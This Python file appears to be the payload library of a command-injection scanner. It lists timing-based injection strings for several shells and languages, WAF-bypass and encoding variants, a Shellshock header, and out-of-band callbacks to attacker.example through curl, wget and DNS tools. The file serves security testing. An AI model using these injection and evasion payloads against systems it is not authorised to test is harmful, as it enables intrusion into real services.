"""cmd_injection payload library — generated dev-time by Claude.

Each entry has confirmable=True/False. Time-confirmable ones use a {N}
placeholder that the scanner substitutes with two different sleep values
to confirm via timing (zero-FP via double-sleep dance). Blind/OOB entries
are reserved for future OOB scanner integration.

Categories:
  linux-shell  — POSIX shells (bash/sh/zsh/dash) + IFS bypass
  windows-cmd  — CMD.EXE + PowerShell
  node-js      — Node child_process injection
  php-cli      — PHP exec/passthru/system
  python-cli   — Python subprocess injection
  perl-ruby    — Perl + Ruby variants
  blind-dns    — Out-of-band DNS exfiltration
  encoded      — URL-encoded / hex / Unicode obfuscation
  waf-bypass   — Bypass common WAF filters (no-space, brace, glob)
"""

CMD_PAYLOADS = [
  # ── Linux shell — separator variants ─────────────────────────
  {"name": "Linux semicolon",      "payload": ";sleep {N}",          "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux semicolon spc",  "payload": "; sleep {N}",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux pipe",           "payload": "|sleep {N}",          "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux pipe spc",       "payload": "| sleep {N}",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux double-pipe",    "payload": "||sleep {N}",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux ampersand",      "payload": "&sleep {N}",          "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux double-amp",     "payload": "&&sleep {N}",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux logical AND",    "payload": "&& sleep {N}",        "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux subshell $()",   "payload": "$(sleep {N})",        "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux backtick",       "payload": "`sleep {N}`",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux newline %0a",    "payload": "%0asleep%20{N}",      "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux CRLF",           "payload": "%0d%0asleep%20{N}",   "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux /bin/sleep abs", "payload": ";/bin/sleep {N}",     "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Linux bash -c",        "payload": ";bash -c 'sleep {N}'", "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Break dquote ;",       "payload": "\";sleep {N};\"",     "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Break squote ;",       "payload": "';sleep {N};'",       "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Close paren ;",        "payload": ");sleep {N}",         "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Chained sleep+true",   "payload": ";sleep {N};true",     "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},

  # ── Windows CMD.EXE + PowerShell ─────────────────────────────
  {"name": "Win amp timeout",      "payload": "& timeout /T {N}",    "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Win && timeout",       "payload": "&& timeout /T {N}",   "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Win pipe timeout",     "payload": "| timeout /T {N}",    "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Win newline",          "payload": "%0atimeout%20/T%20{N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Win ping wait",        "payload": "& ping -n {N} 127.0.0.1", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PS Start-Sleep",       "payload": ";Start-Sleep -s {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PS pipe sleep",        "payload": "|Start-Sleep -s {N}", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True,  "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PS -Command",          "payload": ";powershell -c \"Start-Sleep {N}\"", "category": "windows-cmd", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Node.js child_process ────────────────────────────────────
  {"name": "Node execSync",        "payload": "');require('child_process').execSync('sleep {N}');//", "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Node template lit",    "payload": "${require('child_process').execSync('sleep {N}')}",   "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Node eval",            "payload": "');eval('require(\\'child_process\\').execSync(\\'sleep {N}\\')');//", "category": "node-js", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── PHP CLI ──────────────────────────────────────────────────
  {"name": "PHP system",           "payload": ";system('sleep {N}');",  "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP exec",             "payload": ";exec('sleep {N}');",    "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP shell_exec",       "payload": ";shell_exec('sleep {N}');", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "PHP passthru",         "payload": ";passthru('sleep {N}');", "category": "php-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Python ───────────────────────────────────────────────────
  {"name": "Python os.system",     "payload": "__import__('os').system('sleep {N}')",        "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Python subprocess",    "payload": "__import__('subprocess').call(['sleep','{N}'])", "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Python time.sleep",    "payload": "');__import__('time').sleep({N});#",          "category": "python-cli", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Perl / Ruby ──────────────────────────────────────────────
  {"name": "Perl system",          "payload": "';system(\"sleep {N}\");#",  "category": "perl-ruby", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Ruby system",          "payload": "');system(\"sleep {N}\");#", "category": "perl-ruby", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Ruby backtick",        "payload": "#{`sleep {N}`}",             "category": "perl-ruby", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── WAF Bypass — IFS / brace / quote tricks ──────────────────
  {"name": "IFS bypass ${IFS}",    "payload": ";sleep${IFS}{N}",            "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "IFS9 $IFS$9",          "payload": ";sleep$IFS$9{N}",            "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Tab IFS",              "payload": ";sleep\t{N}",                "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Brace expansion",      "payload": ";{sleep,{N}}",               "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Quote bypass",         "payload": ";sl''eep {N}",               "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Escape bypass",        "payload": ";s\\leep {N}",               "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Wildcard glob",        "payload": ";/?in/sl??p {N}",            "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Char-class glob",      "payload": ";/[b]in/sleep {N}",          "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Null-byte bypass",     "payload": ";sleep {N}%00",              "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Comment bypass",       "payload": ";sleep {N}#",                "category": "waf-bypass", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Encoded ──────────────────────────────────────────────────
  {"name": "URL-enc semicolon",    "payload": "%3Bsleep%20{N}",             "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "URL-enc pipe",         "payload": "%7Csleep%20{N}",             "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Double URL-enc",       "payload": "%253Bsleep%2520{N}",         "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Unicode semicolon",    "payload": ";sleep {N}",                "category": "encoded", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── Header context (Shellshock-style) ────────────────────────
  {"name": "Shellshock fn-def",    "payload": "() { :; }; /bin/sleep {N}",  "category": "linux-shell", "matcher": "TIME>{N}", "confirmable": True, "severity": "CRITICAL", "cvss": 10.0},

  # ── Blind / OOB (no time confirm — for future OOB scanner) ───
  {"name": "Blind DNS curl",       "payload": ";curl http://%RAND%.oob.attacker.example/", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS wget",       "payload": ";wget http://%RAND%.oob.attacker.example/", "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS nslookup",   "payload": ";nslookup %RAND%.oob.attacker.example",     "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS dig",        "payload": ";dig %RAND%.oob.attacker.example",          "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS host",       "payload": ";host %RAND%.oob.attacker.example",         "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "Blind DNS ping",       "payload": ";ping -c1 %RAND%.oob.attacker.example",     "category": "blind-dns", "matcher": "OOB", "confirmable": False, "severity": "CRITICAL", "cvss": 9.8},
]
